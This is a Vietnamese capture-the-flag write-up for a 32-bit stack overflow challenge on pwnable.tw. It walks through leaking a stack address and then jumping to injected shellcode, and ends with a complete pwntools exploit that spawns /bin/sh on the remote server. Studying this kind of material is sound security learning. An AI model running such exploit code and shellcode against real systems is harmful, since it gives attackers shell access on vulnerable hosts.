#### Checksec
Kiểm tra mitigation bao gồm [[NX (Non-executable Stack)]], [[PIE (Position-Independent Executable)]], [[RELRO (Relocation Read-Only)]], [[Stack Canaries]]  
![[Pasted image 20250726164618.png]]
Từ bài ta thấy cơ chế NX bị vô hiệu hóa 
=> NX (non executable) là một cơ chế dùng để ngăn chặn attacker inject shellcode execute trực tiếp trên stack bằng việc hạn chế một số ô nhớ cụ thể và thực thi NX bit. Tuy nhiên cơ chế bảo vệ này vẫn có cách để bypass, cách phổ biến nhất đó là return to libc (https://hackmd.io/@y198/ry6GrF3gi) => Có thể chèn shellcode vào chương trình.
#### File
![[Pasted image 20250727155821.png]]
Phân tích kết quả này cho chúng ta những thông tin quan trọng:
- **ELF 32-bit LSB executable, Intel 80386**: Đây là một tệp thực thi 32-bit cho kiến trúc x86. Điều này xác định môi trường làm việc của chúng ta, bao gồm kích thước con trỏ (4 bytes), thứ tự byte (Little-Endian), và tập lệnh.
- **Statically linked**: Chương trình được liên kết tĩnh. Điều này có nghĩa là tất cả các thư viện cần thiết đã được biên dịch trực tiếp vào tệp nhị phân. Do đó, chúng ta không cần phải lo lắng về việc rò rỉ địa chỉ của libc, nhưng đồng thời, số lượng gadget có sẵn cho kỹ thuật Return-Oriented Programming (ROP) sẽ bị hạn chế nghiêm trọng.
- **Not stripped**: Bảng ký hiệu (symbol table) không bị loại bỏ. Điều này giúp cho việc phân tích ngược trở nên dễ dàng hơn vì tên các hàm và biến có thể vẫn còn tồn tại.
#### Phân tích Kỹ thuật:    
- Chiến lược Khai thác:**
    - **Kỹ thuật chính:** Khai thác được thực hiện qua hai giai đoạn. Giai đoạn đầu tiên là một cuộc tấn công rò rỉ thông tin để vượt qua ASLR trên stack. Giai đoạn thứ hai sử dụng thông tin rò rỉ đó để thực thi shellcode.
    - **Bypass Cơ chế Bảo vệ:**
        - **ASLR (Stack):** Giai đoạn đầu tiên ghi đè địa chỉ trả về bằng địa chỉ của gadget `0x08048087`. Trước khi `ret`, một lệnh `mov ecx, esp` được thực thi. Khi gadget này được gọi, giá trị hiện tại của `esp` (một địa chỉ trên stack) sẽ được sao chép vào `ecx`. Sau đó, chương trình sẽ gửi lại nội dung của `ecx` cho người dùng, làm rò rỉ một địa chỉ stack.
        - **NX:** Sau khi có được địa chỉ stack, giai đoạn hai gửi một payload mới. Payload này chứa shellcode và ghi đè địa chỉ trả về bằng địa chỉ của shellcode trên stack (được tính toán từ địa chỉ đã rò rỉ). Kỹ thuật này được gọi là ret2shellcode.        
- Payload / PoC Mẫu:**  
	- **Payload 1 (Rò rỉ):** `payload = b'A'*20 + p32(0x08048087)`
	- **Tính toán địa chỉ:** `leak = u32(conn.recv(4))`
	- **Payload 2 (Thực thi):** `payload = b'A'*20 + p32(leak + 20) + shellcode`. Giá trị `20` là offset từ địa chỉ stack bị rò rỉ đến vị trí của shellcode.
#### Payload
```Python
from pwn import *

p = remote("chall.pwnable.tw", 10000)
p.readuntil('CTF:')

payload_1 = b'A' * 20 + p32(0x08048087)
p.send(payload_1)
tmp = p.read() # Read the response from the server
leaked_esp = u32(tmp[:4]) # Read the first 4 bytes from the response
log.success("found esp")
log.info(hex(leaked_esp))

# shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x31\xd2\x89\xe3\xb0\x0b\xcd\x80\x30\xc0\xfe\xc0\xcd\x80"
shellcode = asm('''
   	push 6845231
	push 1852400175
	xor edx,edx
	xor ecx,ecx
	xor edx,edx
	mov ebx,esp
	mov al,0xb
	int 0x80

	xor al,al
	inc al
	int 0x80
    ''', arch='i386')
payload_2 = b'B' * 20 + p32(leaked_esp + 20) + shellcode
p.send(payload_2)
p.interactive()
```